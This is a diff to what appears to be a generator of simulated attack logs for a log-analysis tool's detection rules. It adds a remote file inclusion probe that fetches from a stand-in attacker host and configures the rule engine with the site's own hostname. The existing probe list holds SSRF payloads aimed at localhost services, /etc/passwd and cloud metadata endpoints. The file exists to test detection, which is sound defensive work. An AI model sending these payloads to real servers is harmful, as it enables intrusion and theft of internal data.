@@ -776,6 +776,12 @@ def ssrf_attempts(ip: str, day: int, hour: int) -> None:
         "/fetch?url=http%3A//127.0.0.1%3A6379/",
         "/fetch?url=file%3A///etc/passwd",
         "/fetch?url=gopher%3A//127.0.0.1%3A11211/_stats",
+        # Not an internal address at all — somebody else's server, which is
+        # remote file inclusion rather than SSRF-to-self. It is the one probe
+        # here that logarc cannot judge on its own: `/fetch?url=` to
+        # `https://shop.test/...` would be ordinary, and only knowing that
+        # shop.test is this site makes cdn.attacker.test different.
+        "/fetch?url=https%3A//cdn.attacker.test/payload.txt",
         "/fetch?target=http%3A//2852039166/latest/meta-data/",
         "/fetch?target=http%3A//0xa9fea9fe/",
         "/fetch?target=http%3A//%5B%3A%3Affff%3A7f00%3A1%5D/",
@@ -1018,7 +1024,12 @@ def check() -> int:
 
     root = Path(__file__).resolve().parents[2]
     rules = load_rules([root / "src" / "logarc" / "detect" / "rulepacks"])
-    engine = RuleEngine(rules)
+    # Built knowing the site's own name, because one rule is deliberately silent
+    # until somebody supplies it: `rfi_offsite_url` compares a URL in a
+    # parameter against the hosts the reader named, and with nothing named it
+    # never fires. Passing SITE here is this log playing the reader who answered
+    # — which is also the state the demo is meant to show.
+    engine = RuleEngine(rules, site_hosts=(SITE,))
     parser = get_parser("apache-vhost-combined")
 
     # Grouped by client, because window rules need a client's requests together
